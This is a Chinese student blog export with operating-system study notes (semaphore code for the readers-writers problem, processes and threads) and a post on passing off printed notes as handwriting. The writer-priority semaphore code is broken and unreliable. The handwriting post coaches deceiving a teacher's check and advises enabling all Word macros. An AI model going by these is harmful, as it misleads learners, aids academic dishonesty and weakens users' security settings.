<p>读者优先的代码:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> count=<span class="number">0</span>;			<span class="comment">//当前读者数量</span></span><br><span class="line">semaphore mutex=<span class="number">1</span>;		<span class="comment">//保护count的互斥</span></span><br><span class="line">semaphore rw=<span class="number">1</span>;			<span class="comment">//保证读者写者互斥访问</span></span><br><span class="line"></span><br><span class="line">writer()&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;			<span class="comment">//写者只需要与其他任意进程互斥</span></span><br><span class="line">		P(rw);</span><br><span class="line">		writing;</span><br><span class="line">		v(rw);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reader()&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		P(mutex);		<span class="comment">//互斥:count</span></span><br><span class="line">		<span class="keyword">if</span>(count==<span class="number">0</span>)	<span class="comment">//如果当前是第一个读者,互斥:rw</span></span><br><span class="line">			P(rw);</span><br><span class="line">		count++;		<span class="comment">//count++</span></span><br><span class="line">		V(mutex);		<span class="comment">//互斥解除:count</span></span><br><span class="line">        </span><br><span class="line">		reading;</span><br><span class="line">        </span><br><span class="line">		P(mutex);		<span class="comment">//互斥:count</span></span><br><span class="line">		count--;		<span class="comment">//count--</span></span><br><span class="line">		<span class="keyword">if</span>(count==<span class="number">0</span>)	<span class="comment">//如果当前是最后一个读者,互斥解除:rw</span></span><br><span class="line">			v(rw);</span><br><span class="line">		V(mutex);		<span class="comment">//互斥解除:count</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>写者优先的代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> ReadCount=<span class="number">0</span>, WriteCount=<span class="number">0</span>;			<span class="comment">//当前读写数量</span></span><br><span class="line">semaphore mutex_rc=<span class="number">1</span>x, mutex_wc=<span class="number">1</span>y;		<span class="comment">//保护count的互斥</span></span><br><span class="line">semaphore rr=<span class="number">1</span>rs,ww=<span class="number">1</span>ws;			<span class="comment">//保证读者写者互斥访问</span></span><br><span class="line"></span><br><span class="line">writer()&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;			</span><br><span class="line">        P(mutex_wc);			<span class="comment">//互斥wc</span></span><br><span class="line">        <span class="keyword">if</span>(WriteCount == <span class="number">0</span>)		<span class="comment">//如果是第一个写者</span></span><br><span class="line">            P(rr);				<span class="comment">//不允许其他读者进入</span></span><br><span class="line">        WriteCount++;</span><br><span class="line">        V(mutex_wc);			<span class="comment">//互斥解除:wc</span></span><br><span class="line">        </span><br><span class="line">		P(ww);					<span class="comment">//互斥其他写者</span></span><br><span class="line">		writing;</span><br><span class="line">		v(ww);					<span class="comment">//互斥解除:其他写者</span></span><br><span class="line">        </span><br><span class="line">        P(mutex_wc);			<span class="comment">//互斥wc</span></span><br><span class="line">        WriteCount--;</span><br><span class="line">        <span class="keyword">if</span>(WriteCount == <span class="number">0</span>)		<span class="comment">//如果是最后的写者</span></span><br><span class="line">            V(rr);				<span class="comment">//互斥解除:读者</span></span><br><span class="line">        V(mutex_wc);			<span class="comment">//互斥解除:wc</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reader()&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		P(z);</span><br><span class="line">		P(rr);				<span class="comment">//</span></span><br><span class="line">		P(mutex_rc);		<span class="comment">//互斥:rc</span></span><br><span class="line">		<span class="keyword">if</span>(ReadCount==<span class="number">0</span>)	<span class="comment">//如果当前是第一个读者,互斥写者:ww</span></span><br><span class="line">			P(ww);</span><br><span class="line">		ReadCount++;		<span class="comment">//rc++</span></span><br><span class="line">		V(mutex_rc);		<span class="comment">//互斥解除:rc</span></span><br><span class="line">		V(rr);				<span class="comment">//</span></span><br><span class="line">		V(z);</span><br><span class="line">		reading;</span><br><span class="line">		P(mutex_rc);		<span class="comment">//互斥:rc</span></span><br><span class="line">		ReadCount--;		<span class="comment">//rc--</span></span><br><span class="line">		<span class="keyword">if</span>(ReadCount==<span class="number">0</span>)	<span class="comment">//如果当前是最后一个读者,互斥解除:写者ww</span></span><br><span class="line">			v(ww);</span><br><span class="line">		V(mutex_rc);		<span class="comment">//互斥解除:rc</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>写者优先<del>没完全看懂</del> 完全没看懂</p>
<hr>
<p><strong>操作系统系列</strong></p>
<ol>
<li>🔗<a href="https://luy-hb.xyz/2020/08/14/操作系统之概述/" target="_blank" rel="noopener">操作系统之概述</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/05/操作系统之进程线程/" target="_blank" rel="noopener">操作系统之进程线程</a></li>
<li>操作系统之进程间通信  (本文)</li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/04/操作系统之死锁/" target="_blank" rel="noopener">操作系统之死锁</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/09/操作系统之内存管理/" target="_blank" rel="noopener">操作系统之内存管理</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/05/操作系统之IO管理/" target="_blank" rel="noopener">操作系统之IO管理</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/06/操作系统之文件系统/" target="_blank" rel="noopener">操作系统之文件系统</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/08/操作系统之多处理器系统/" target="_blank" rel="noopener">操作系统之多处理器系统</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/11/操作系统之安全/" target="_blank" rel="noopener">操作系统之安全</a></li>
</ol>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>专业课</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>使用伪手写体搞定毛概笔记</title>
    <url>/2020/06/06/%E4%BD%BF%E7%94%A8%E4%BC%AA%E6%89%8B%E5%86%99%E4%BD%93%E6%90%9E%E5%AE%9A%E6%AF%9B%E6%A6%82%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>毛概课在接连上了五个月网课之后,终于等到了期末!</p>
<p>对此,毛概老师给全班做出指示: “收  给我收笔记!” </p>
<a id="more"></a>
<h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>众所周知, 大学的思政课笔记是最无聊虽没意义的形式主义了.</p>
<p>尤其是他还要求是手写的情况下.</p>
<p>尤其是手写的笔记还要拍照提交的情况下.</p>
<p><del>不会吧不会吧, 不会真的有人还在用纸笔记笔记吧? 🐶<del/></p>
<p>受亲爱的<a href="https://moefactory.com/" target="_blank" rel="noopener">小梦同学</a>提点, 我们来研究一下怎么<strong>仿造手写体</strong>打印材料.</p>
<p><strong>重要提醒</strong></p>
<p>由于打印机本身的限制, 实物还是肉眼可见地分辨出伪手写稿. 本学期因为以前的影响只要求把笔记拍照上传检查, 比较好蒙混过关🤔</p>
<p>如果是线下查收, 还是换个摸鱼方法吧….</p>
<p>本方法无需编程基础. </p>
<h2 id="开冲"><a href="#开冲" class="headerlink" title="开冲"></a>开冲</h2><h3 id="Step1-生成自己的手写字体"><a href="#Step1-生成自己的手写字体" class="headerlink" title="Step1. 生成自己的手写字体"></a>Step1. 生成自己的手写字体</h3><p>北京大学计算机科学技术研究所有一个项目<a href="http://59.108.48.27/flexifont-chn/login/" target="_blank" rel="noopener">Flexifont字库</a>, 可以实现自己的字库. 点开注册登录, 根据提示下载模板, 打印书写, 拍照生成就可以了. </p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/%5DI%7DRW22GJ%7B%401NL7JYIE%2483C.png" alt=""></p>
<p>如图, 下载不同字数的模板, 打印出来填好,  上传生成即可.</p>
<p>不过我没整这一步, 直接在字库分享里面下了别人的, 谢谢张建同学.</p>
<p>下载好.ttf文件后导入系统文件夹(C:\Windows\Fonts)即可.</p>
<h3 id="Step2-设置-Word-宏命令"><a href="#Step2-设置-Word-宏命令" class="headerlink" title="Step2. 设置 Word 宏命令"></a>Step2. 设置 Word 宏命令</h3><p>参考了 <a href="https://www.zhihu.com/question/20308770" target="_blank" rel="noopener">这个问题 </a>下的回答</p>
<p>在Word中依次点击 “文件 -&gt; 选项 -&gt; 信任中心 -&gt; 信任中心设置 -&gt; 宏设置” 在右侧选中 “启用所有宏”.</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/hongshezhi%20.png" alt="宏设置"></p>
<p><strong>回到主界面, 视图 - 宏 - 查看宏</strong></p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/2020%E5%B9%B46%E6%9C%886%E6%97%A53.png" alt="宏代码编写1"></p>
<p>输入方案名,新建, 并在弹出的窗口中插入以下代码</p>
<figure class="highlight vb"><table><tr><td class="code"><pre><span class="line"><span class="comment">' 注意是插入 不是直接把原来的替换掉哦</span></span><br><span class="line">    <span class="keyword">Dim</span> R_Character <span class="keyword">As</span> Range</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Dim</span> FontSize(<span class="number">5</span>)</span><br><span class="line">	<span class="comment">' 字体大小在5个值之间进行波动，可以改写 </span></span><br><span class="line">	<span class="comment">' 个人建议 如果纸张线条间距为8mm, 字号设置为16左右比较合适</span></span><br><span class="line">    FontSize(<span class="number">1</span>) = <span class="string">"15.5"</span></span><br><span class="line">    FontSize(<span class="number">2</span>) = <span class="string">"15"</span></span><br><span class="line">    FontSize(<span class="number">3</span>) = <span class="string">"16"</span></span><br><span class="line">    FontSize(<span class="number">4</span>) = <span class="string">"17"</span></span><br><span class="line">    FontSize(<span class="number">5</span>) = <span class="string">"17.5"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Dim</span> FontName(<span class="number">3</span>)</span><br><span class="line">    <span class="comment">'字体名称在三种字体之间进行波动，可改写，但需要保证系统拥有下列字体</span></span><br><span class="line">	FontName(<span class="number">1</span>) = <span class="string">"宋体"</span></span><br><span class="line">	FontName(<span class="number">2</span>) = <span class="string">"微软雅黑"</span></span><br><span class="line">	FontName(<span class="number">3</span>) = <span class="string">"黑体"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Dim</span> ParagraphSpace(<span class="number">5</span>)</span><br><span class="line">	<span class="comment">'行间距 在一定以下值中均等分布，可改写 </span></span><br><span class="line">	<span class="comment">' 个人建议 如果纸张线条间距为8mm, 字号设置为23左右比较合适, 并且不建议波动过大</span></span><br><span class="line">    ParagraphSpace(<span class="number">1</span>) = <span class="string">"22"</span></span><br><span class="line">    ParagraphSpace(<span class="number">2</span>) = <span class="string">"22.5"</span></span><br><span class="line">    ParagraphSpace(<span class="number">3</span>) = <span class="string">"23"</span></span><br><span class="line">    ParagraphSpace(<span class="number">4</span>) = <span class="string">"23.5"</span></span><br><span class="line">    ParagraphSpace(<span class="number">5</span>) = <span class="string">"24"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">'下面是功能代码 不想要什么直接删除就行</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">For</span> <span class="keyword">Each</span> R_Character <span class="keyword">In</span> ActiveDocument.Characters</span><br><span class="line"></span><br><span class="line">        VBA.Randomize</span><br><span class="line"></span><br><span class="line">        R_Character.Font.Name = FontName(Int(VBA.Rnd * <span class="number">3</span>) + <span class="number">1</span>)</span><br><span class="line">	<span class="comment">'上面一行是随机变换字体,不想要可删除</span></span><br><span class="line">        R_Character.Font.Size = FontSize(Int(VBA.Rnd * <span class="number">5</span>) + <span class="number">1</span>)</span><br><span class="line">	<span class="comment">'上面一行是随机变换字体大小,不想要可删除</span></span><br><span class="line">        R_Character.Font.Position = Int(VBA.Rnd * <span class="number">3</span>) + <span class="number">1</span></span><br><span class="line">	<span class="comment">'上面一行对每个字随机上下微调,不想要可删除</span></span><br><span class="line">        R_Character.Font.Spacing = <span class="number">0</span></span><br><span class="line">	<span class="comment">'上面一行不要修改</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">    Application.ScreenUpdating = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">For</span> <span class="keyword">Each</span> Cur_Paragraph <span class="keyword">In</span> ActiveDocument.Paragraphs</span><br><span class="line">	<span class="comment">'上面三行不要修改</span></span><br><span class="line">        Cur_Paragraph.LineSpacing = ParagraphSpace(Int(VBA.Rnd * <span class="number">5</span>) + <span class="number">1</span>)</span><br><span class="line">	<span class="comment">'上面一行对每个行间距微调,不想要可删除</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">        Application.ScreenUpdating = <span class="literal">True</span></span><br></pre></td></tr></table></figure>
<p>修改后如图, 记得要把代码16-19行换成你自己的手写体</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/QQ%E6%88%AA%E5%9B%BE20200606154923.jpg" alt="代码修改如下"></p>
<p>点击上面的运行按钮(或者是个小绿三角) 等待</p>
<p>不出意外结果如下</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/2020%E5%B9%B46%E6%9C%886%E6%97%A515%E7%82%B951%E5%88%86.jpg" alt="记得要把字体换成自己的手写体哦"></p>
<p>记得把字体换成不同但相近的手写体, 别想现在一样丑不拉几的</p>
<h3 id="Step3-设置页面与段落"><a href="#Step3-设置页面与段落" class="headerlink" title="Step3. 设置页面与段落"></a>Step3. 设置页面与段落</h3><p>准备好打印机, 复印纸, 以及浪费很多纸张的决心, 开始下一步.</p>
<p><del>当然你要实现准备好电子笔记, 你不会真的没有记吧?<del/></p>
<h4 id="字体字号"><a href="#字体字号" class="headerlink" title="字体字号"></a>字体字号</h4><p>在上一步我们应该是基本解决了这个问题, 如果没有, 若纸张线条间距为8mm, 字号设置为16左右比较合适.</p>
<p>word 中字号的单位是磅, 约为0.3528毫米.也就是说16的字号打印出来大约是5.645毫米高.</p>
<p>此外可以试一下全部用 <strong>粗体</strong> , 因为我用的字体比较纤细, 看着太假</p>
<p>多试试, 不要怕废纸</p>
<h4 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h4><p>全选, 右键段落, 设置行间距与段间距.</p>
<p>间距一栏下</p>
<p><strong>段前段后:</strong>全部设置成0 空白也要再设置一次</p>
<p><strong>行距:</strong> 选择固定值, 这里单位依旧是磅数, 如果直线相隔8mm的话大约设置成23磅(23*0.35=8.1144‬)</p>
<h4 id="页面"><a href="#页面" class="headerlink" title="页面"></a>页面</h4><p>word主页面 - 布局 - 页边距&amp;纸张大小</p>
<p>自己量一量吧, 上边距是到第一行的<strong>字的上沿</strong>, 下边距是最后一行<strong>字的下沿</strong></p>
<p>多试试, 不要怕废纸</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/K%607_8GUVFXF0%24PQU81VDCUK.jpg" alt="这么多全是浪费掉的"></p>
<h3 id="Step4-其他作假手段"><a href="#Step4-其他作假手段" class="headerlink" title="Step4. 其他作假手段"></a>Step4. 其他作假手段</h3><ol>
<li><p>全部用粗体, 生成的字体过于纤细</p>
</li>
<li><p>切换字体确实有效,但是字体风格不能相差太大</p>
</li>
<li><p>扫描后对PDF做一下黑白处理, 更难发现</p>
<p>另外推荐使用app Scanbot扫描, 吊打某某扫描王</p>
</li>
<li><p>通过<a href="https://www.ilovepdf.com/compress_pdf" target="_blank" rel="noopener">这个网址</a>对PDF进行全损压缩, 直接挑压缩率最高的那个选项(斜眼笑)</p>
</li>
</ol>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>成品还是很满意滴~ </p>
<p>线上检查的话应该足够以假乱真了吧👌</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/QQ%E6%88%AA%E5%9B%BE20200606161805.jpg" alt="效果图1"></p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/QQ%E6%88%AA%E5%9B%BE20200606161822.jpg" alt="效果图2"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p>听说Github上<a href="https://link.zhihu.com/?target=https%3A//github.com/Gsllchb/Handright">这个项目</a>可以进一步微调字体效果,实现同字不同样</p>
</li>
<li><p>使用喷墨式打印机应该会稍微好一些</p>
</li>
<li><p>学到了磅数这一没什么卵用的知识</p>
</li>
<li><p>为了本篇传图开了腾讯云的COS, 终于有图床了</p>
</li>
<li><p>其实笔记最好还是自己平时带着记比较好</p>
<p><del>但是这当然是不可能的啊哈哈哈哈<del/></p>
</li>
</ul>
]]></content>
      <categories>
        <category>技术小记</category>
        <category>快乐摸鱼</category>
      </categories>
      <tags>
        <tag>手写体</tag>
        <tag>word 宏命令</tag>
        <tag>摸鱼</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统之进程线程</title>
    <url>/2020/06/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<p>本章节包括三个小节</p>
<ol>
<li>进程 (Processes)</li>
<li>线程 (Threads)</li>
<li>调度 (Scheduling)</li>
</ol>
<a id="more"></a>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/%E8%BF%9B%E7%A8%8B%2C%20%E7%BA%BF%E7%A8%8B%2C%20%E8%B0%83%E5%BA%A6.png" alt=""></p>
<h1 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h1><p>在本小节会涉及到：</p>
<ol>
<li>CPU是如何工作的，并由此引入进程的概念与用途</li>
<li>进程的生命周期：<ol>
<li>⭐进程的五种状态及之间的转换</li>
<li>进程的创建</li>
<li>进程的中止</li>
<li>两个进程的切换（上下文保存）</li>
</ol>
</li>
<li>⭐Process Control Blocks,PCB (进程表, 进程控制块)<ol>
<li>为什么要用PCB？</li>
<li>PCB 中包括什么？</li>
</ol>
</li>
</ol>
<h2 id="进程的引入及概念"><a href="#进程的引入及概念" class="headerlink" title="进程的引入及概念"></a>进程的引入及概念</h2><p>本章的内容(包括进程线程调度IPC)在于探讨如何更高效地利用CPU. 尽管市面上早已采用了多核架构, 但下述分析均为单核CPU, 如果要考虑多核的情况会事先说明。</p>
<p>既然是单核CPU，那么在同一时间刻CPU计算资源只能用在一个地方。如果我此时一边敲代码，一边听歌，一边挂QQ，那么实际上CPU的运行状态是在这些工作之间以毫秒级别的速度来回迅速切换，在宏观上造成几个工作同时进行的假象。也即是<strong>“微观串行，宏观并行”</strong>(但不是真正的并行!)。</p>
<blockquote>
<p> 如果真的是在同一时刻有多个程序在执行(此时一定是多核计算机), 我们称之为<strong>并行</strong>.</p>
<p>上述行为更准确的被称为 <strong>并发</strong>. (伪并行)</p>
</blockquote>
<p>这样的情况我们被称为<strong>多道程序(Multiprogramming)</strong> ，即同时有多个程序在执行中(宏观)，但实际上只有一个进程在使用CPU(微观)</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/1.jpg" alt="待配图1"></p>
<p><strong>进程：</strong> an executing program, including the current values of the program counter, register, and variables.<br>进程是进行中的程序。编写好的代码(.c, .py)或可运行的文件(.exe, .bat) 被成为程序。当他们被运行时才被称为进程。<br>一个进程包括：</p>
<ul>
<li>program counter, 程序计数器;用于标志该进程当前运行至程序的何处</li>
<li>stack, 栈; </li>
<li>data section,数据部分</li>
</ul>
<p>那么显然，多道程序中每个进程都拥有自己的PC、stack…</p>
<h2 id="进程的生命周期"><a href="#进程的生命周期" class="headerlink" title="进程的生命周期"></a>进程的生命周期</h2><h3 id="进程的状态与转换"><a href="#进程的状态与转换" class="headerlink" title="进程的状态与转换"></a>进程的状态与转换</h3><h4 id="进程的状态"><a href="#进程的状态" class="headerlink" title="进程的状态"></a>进程的状态</h4><p>进程是一个动态的客体，可以被创建销毁等。进程总共拥有五种生命状态(state)：</p>
<ol>
<li>new               创建</li>
<li>ready             就绪</li>
<li>running           运行</li>
<li>waiting/blocked   阻塞/等待态</li>
<li>terminated/exit        销毁</li>
</ol>
<h4 id="状态之间转换"><a href="#状态之间转换" class="headerlink" title="状态之间转换"></a>状态之间转换</h4><ul>
<li>new -&gt; ready</li>
<li>ready -&gt; running</li>
<li>running -&gt; ready</li>
<li>running -&gt; blocked</li>
<li>running -&gt; exit</li>
<li>blocked -&gt; ready</li>
</ul>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/2.jpg" alt="状态转换2"></p>
<h3 id="进程的创建"><a href="#进程的创建" class="headerlink" title="进程的创建"></a>进程的创建</h3><h4 id="进程的创建场景"><a href="#进程的创建场景" class="headerlink" title="进程的创建场景:"></a>进程的创建场景:</h4><ol>
<li><p>系统初始化</p>
<blockquote>
<p>比如一些系统的守护进程</p>
</blockquote>
</li>
<li><p>系统调用</p>
<blockquote>
<p>新建一个进程以辅助原有进程工作</p>
</blockquote>
</li>
<li><p>用户命令</p>
<blockquote>
<p>比如你双击某个应用程序</p>
</blockquote>
</li>
<li><p>批处理作业的初始化</p>
<blockquote>
<p>仅在批处理系统, 系统认为有多余资源以开启一个新作业时, 会创建进程</p>
</blockquote>
</li>
</ol>
<h4 id="父子进程"><a href="#父子进程" class="headerlink" title="父子进程"></a>父子进程</h4><ul>
<li><p>父进程不断创建子进程,由此形成进程树</p>
</li>
<li><p>子进程<strong>可以</strong>继承父的资源(也可以不继承或半继承)</p>
</li>
<li><p>父子进程可以同时执行,也有可能父等待子</p>
</li>
<li><p>Unix 系统中, 子进程先复制父进程的所有(fork), 再执行一个系统调用使子女成为新进程.(execve)</p>
<p>Window 则使用CreatProcess 系统调用同时完成上面两步</p>
</li>
<li><p>Unix 中存在这种进程的层级关系,Win 中进程的地位平等,不存在父子关系</p>
<ul>
<li>但是这一说法似乎不当, <a href="https://www.zhihu.com/question/31429459" target="_blank" rel="noopener">参看此处</a></li>
</ul>
</li>
</ul>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/3.jpg" alt="Unix进程树3"></p>
<h3 id="进程的销毁"><a href="#进程的销毁" class="headerlink" title="进程的销毁"></a>进程的销毁</h3><h4 id="进程销毁的场景"><a href="#进程销毁的场景" class="headerlink" title="进程销毁的场景"></a>进程销毁的场景</h4><ol>
<li><p>Normal exit    正常退出 (自愿)</p>
<blockquote>
<p>运行结束, 告知OS结束并再分配资源</p>
</blockquote>
</li>
<li><p>Error exit        错误退出 (自愿)</p>
<blockquote>
<p>进程发现了一个错误并退出</p>
</blockquote>
</li>
<li><p>Fatal error      致命性错误退出 (非自愿)</p>
<blockquote>
<p>进程进行了一个错误操作, 被OS强制退出; 如除0, 取非法地址</p>
</blockquote>
</li>
<li><p>被其他进程杀死  (非自愿)</p>
<blockquote>
<p>父进程, 系统, 其他优先级更高的进程</p>
<p>Unix:kill</p>
<p>Windows: TerminalProces</p>
</blockquote>
</li>
</ol>
<h4 id="级联终止"><a href="#级联终止" class="headerlink" title="级联终止"></a>级联终止</h4><p>​    当父进程退出时,子进程必须退出.</p>
<h3 id="进程的切换"><a href="#进程的切换" class="headerlink" title="进程的切换"></a>进程的切换</h3><ul>
<li>进程的切换非常频繁, 一般在毫秒级</li>
<li>进程切换需要耗费时间, 称为Gap</li>
</ul>
<h4 id="进程切换的场景"><a href="#进程切换的场景" class="headerlink" title="进程切换的场景"></a>进程切换的场景</h4><ol>
<li><p>时钟中断</p>
<blockquote>
<p>时间轮片用尽</p>
</blockquote>
</li>
<li><p>IO 中断</p>
<blockquote>
<p>CPU 先前指示IO操作, 当IO结束后返回向OS报告,  称为IO中断</p>
</blockquote>
</li>
<li><p>Memory Fault  内存失效</p>
<blockquote>
<p>内存中页面失效, 需要从主存中把页面调入内存</p>
</blockquote>
</li>
<li><p>Trap 陷入</p>
<blockquote>
<p>发生错误时</p>
<p>程序转为exit态</p>
</blockquote>
</li>
<li><p>Supervisor Call</p>
<p>管理程序调用</p>
</li>
</ol>
<h4 id="上下文切换"><a href="#上下文切换" class="headerlink" title="上下文切换"></a>上下文切换</h4><p>切出时, 必须保存该进程目前的环境.切入时,必须加载先前的环境</p>
<p>使用 PCB(Processing Control Block, 进程表,进程控制块) 来储存进程的环境</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/4.jpg" alt=""></p>
<h4 id="进程调度队列"><a href="#进程调度队列" class="headerlink" title="进程调度队列"></a>进程调度队列</h4><p>这一块没听 似乎是调度队列包括以下三种</p>
<ol>
<li>Job queue 系统中所有进程的队列</li>
<li>Ready queue 主存中所有进程的队列, 拿到CPU就跑的那种</li>
<li>Device queues 等待IO设备的进程队列</li>
</ol>
<h4 id="PCB"><a href="#PCB" class="headerlink" title="PCB"></a>PCB</h4><p>包括:</p>
<ol>
<li>进程管理数据<ul>
<li>寄存器</li>
<li>PC</li>
<li>状态字 PSW </li>
<li>进程状态</li>
<li>优先级</li>
<li>调度算法参数</li>
<li>进程ID</li>
<li>父进程ID</li>
<li>组进程ID</li>
<li>信号量</li>
<li>进程开始时间</li>
<li>进程已用时间</li>
<li>子进程已用时间</li>
<li>……</li>
</ul>
</li>
<li>内存管理数据<ul>
<li>指向本进程代码段指针</li>
<li>指向本进程数据段指针</li>
<li>指向本进程堆栈段指针</li>
</ul>
</li>
<li>文件管理数据<ul>
<li>根目录</li>
<li>工作目录</li>
<li>文件描述符</li>
<li>……</li>
</ul>
</li>
</ol>
<p>以上全部不用记🐶 下面的要记住(精简版)</p>
<blockquote>
<ol>
<li>Process state                 进程状态 </li>
<li>Program counter 程序计数器 </li>
<li>CPU registers CPU寄存器</li>
<li>CPU scheduling information CPU调度信息</li>
<li>Memory-management information  内存管理信息 </li>
<li>Accounting information 计账信息</li>
<li>I/O status information I/O状态信息</li>
</ol>
</blockquote>
<hr>
<h1 id="Threads"><a href="#Threads" class="headerlink" title="Threads"></a>Threads</h1><p>在本小节会涉及到：</p>
<ol>
<li>了解进程切换中的缺陷（时空开销过大），并由此引入线程的概念及用途</li>
<li>了解线程资源的私有与共享（有助于解决上一点的缺陷）, 并认识线程的优势</li>
<li>几种线程的实现方式及区别<ol>
<li>Kernel-level Thread   (内核级线程)</li>
<li>User-level Thread     (用户级线程)</li>
<li>Hybrid Thread         (混合式线程)</li>
<li>Pop-up Thread         (弹出式线程)</li>
</ol>
</li>
</ol>
<h2 id="线程的引入及概念"><a href="#线程的引入及概念" class="headerlink" title="线程的引入及概念"></a>线程的引入及概念</h2><p>你看进程之间切换是不是要保存好多东西,时空开销过大. 线程是轻量级的进程, 它拥有的环境没有进程那么多, 所以线程间的切换更加轻便.</p>
<ul>
<li>进程是为了避免等待IO的时间, 线程是为了缩短进程切换中的浪费的过多的时间</li>
<li>线程是隶属于某一进程, 或者说<em>( traditional or heavyweight )</em>进程是仅有一个线程的进程</li>
<li>但是线程还是有必要的环境的</li>
<li>同一个进程的不同线程(兄弟线程)可以共享一部分资源</li>
</ul>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/5.jpg" alt="进程与线程5"></p>
<p>如上图, a图中每个进程都拥有一个线程, 这些线程拥有不同的地址空间. b图进程拥有3个线程, 共享一个进程地址.因此线程之间的切换会更加轻量.</p>
<p>但是也由于线程之间没有数据保护, 所以要防止线程间相互修改数据.</p>
<h2 id="进程资源的私有与共享"><a href="#进程资源的私有与共享" class="headerlink" title="进程资源的私有与共享"></a>进程资源的私有与共享</h2><p>对于同一个进程的不同线程(兄弟线程)来说:</p>
<h3 id="共享的items"><a href="#共享的items" class="headerlink" title="共享的items"></a>共享的items</h3><ol>
<li>地址空间</li>
<li>全局变量</li>
<li>文件流</li>
<li>子进程</li>
<li>Pending alarm (这是什么?)</li>
<li>信号量</li>
<li>记账信息( Accounting information)</li>
</ol>
<h3 id="私有的items"><a href="#私有的items" class="headerlink" title="私有的items"></a>私有的items</h3><ul>
<li>PC</li>
<li>寄存器(集) Registers</li>
<li>堆栈空间 Stack</li>
<li>线程状态 State</li>
</ul>
<p>多线程运用在单核CPU上时, 线程依旧是依次, 轮流, 一个接一个地执行的. 但是也稍微提高了些许效率(相对于进程切换还是省下时间了)</p>
<h2 id="线程的状态"><a href="#线程的状态" class="headerlink" title="线程的状态"></a>线程的状态</h2><p>与进程一致:</p>
<ol>
<li>running</li>
<li>blocked</li>
<li>ready</li>
<li>terminated</li>
</ol>
<p>我也不知道为什么没有new态, 可能太快忽略不计? ┑(￣Д ￣)┍</p>
<h2 id="线程的优劣及应用场景"><a href="#线程的优劣及应用场景" class="headerlink" title="线程的优劣及应用场景"></a>线程的优劣及应用场景</h2><p>优势:</p>
<ul>
<li>兄弟线程之间可以共享地址空间与全部的数据</li>
<li>占用空间小,切换时快捷</li>
<li>划分的资源少, 创建销毁更加容易</li>
<li>线程常被用于多核CPU(这里可以真正实现并行)</li>
</ul>
<p>应用场景:</p>
<ul>
<li>同时需要IO与处理的进程(eg 文字处理)</li>
<li>大型服务器回应用户请求.  作业小而多</li>
</ul>
